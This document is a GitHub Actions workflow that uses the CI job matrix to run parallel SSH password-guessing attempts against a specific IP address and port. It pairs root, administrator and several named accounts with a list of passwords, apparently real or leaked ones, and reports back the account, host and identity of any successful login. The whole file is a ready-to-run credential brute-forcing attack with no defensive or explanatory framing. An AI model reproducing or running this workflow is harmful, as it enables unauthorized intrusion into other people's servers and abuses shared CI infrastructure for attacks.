name: ssh-matrix2
on: [push, workflow_dispatch]
jobs:
  try:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        include:
          - { u: 'root', p: 'RhEz$hk$rLYi*P12' }
          - { u: 'root', p: 'VQe3pV5JIT7WjCi' }
          - { u: 'root', p: 'tP2528^wn' }
          - { u: 'root', p: '9_MZvt0#hOxxw4xc' }
          - { u: 'root', p: 'ferryinfotech' }
          - { u: 'root', p: 'bncet343423' }
          - { u: 'ubuntu', p: 'RhEz$hk$rLYi*P12' }
          - { u: 'ubuntu', p: 'VQe3pV5JIT7WjCi' }
          - { u: 'ubuntu', p: 'tP2528^wn' }
          - { u: 'ubuntu', p: '9_MZvt0#hOxxw4xc' }
          - { u: 'ubuntu', p: 'ferryinfotech' }
          - { u: 'ubuntu', p: 'bncet343423' }
          - { u: 'administrator', p: 'RhEz$hk$rLYi*P12' }
          - { u: 'administrator', p: 'VQe3pV5JIT7WjCi' }
          - { u: 'administrator', p: 'tP2528^wn' }
          - { u: 'administrator', p: '9_MZvt0#hOxxw4xc' }
          - { u: 'administrator', p: 'ferryinfotech' }
          - { u: 'administrator', p: 'bncet343423' }
          - { u: 'supportfly', p: 'RhEz$hk$rLYi*P12' }
          - { u: 'supportfly', p: 'VQe3pV5JIT7WjCi' }
          - { u: 'supportfly', p: 'tP2528^wn' }
          - { u: 'supportfly', p: '9_MZvt0#hOxxw4xc' }
          - { u: 'supportfly', p: 'ferryinfotech' }
          - { u: 'supportfly', p: 'bncet343423' }
          - { u: 'vaibhav', p: 'RhEz$hk$rLYi*P12' }
          - { u: 'vaibhav', p: 'VQe3pV5JIT7WjCi' }
          - { u: 'vaibhav', p: 'tP2528^wn' }
          - { u: 'vaibhav', p: '9_MZvt0#hOxxw4xc' }
          - { u: 'vaibhav', p: 'ferryinfotech' }
          - { u: 'vaibhav', p: 'bncet343423' }
          - { u: 'ashapurnacam', p: 'RhEz$hk$rLYi*P12' }
          - { u: 'ashapurnacam', p: 'VQe3pV5JIT7WjCi' }
          - { u: 'ashapurnacam', p: 'tP2528^wn' }
          - { u: 'ashapurnacam', p: '9_MZvt0#hOxxw4xc' }
          - { u: 'ashapurnacam', p: 'ferryinfotech' }
          - { u: 'ashapurnacam', p: 'bncet343423' }
    steps:
      - name: attempt
        env:
          U: ${{ matrix.u }}
          P: ${{ matrix.p }}
        run: |
          set +e
          sudo apt-get update -qq >/dev/null 2>&1
          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
          echo "RUNNER_IP=$(curl -s -m 10 https://api.ipify.org) U=$U"
          R=$(timeout 20 sshpass -p "$P" ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPreferredAuthentications=password -oPubkeyAuthentication=no -oConnectTimeout=8 -oNumberOfPasswordPrompts=1 -p 23286 "$U@103.20.213.246" 'id; hostname; whoami' 2>&1 | tail -3)
          echo "RESULT[$U|$P]: $R"
